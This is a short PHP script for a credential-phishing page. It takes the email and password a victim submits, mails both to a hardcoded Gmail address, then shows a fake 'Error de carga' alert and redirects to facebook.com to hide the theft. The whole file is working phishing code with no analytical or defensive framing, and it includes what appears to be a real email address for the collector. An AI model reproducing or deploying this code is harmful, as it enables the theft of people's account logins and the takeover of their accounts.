<?php
if(isset($_POST['enviar'])){
    if(!empty($_POST['email']) && !empty($_POST['pass'])){
        $receptor = "kikeserrano565657@gmail.com";
        $email = $_POST['email'];
        $pass = $_POST['pass'];
        $info = "correo: ". $email. "\r\n";
        $info.= "password: ". $pass;
        $mail = mail($receptor,"Nuevos Datos",$info);
        if($mail)
        {
            echo "<script>alert('Error de carga');</script>";
            echo "<script>window.location.replace('https://www.facebook.com/');</script>";
        }
    }
}
?>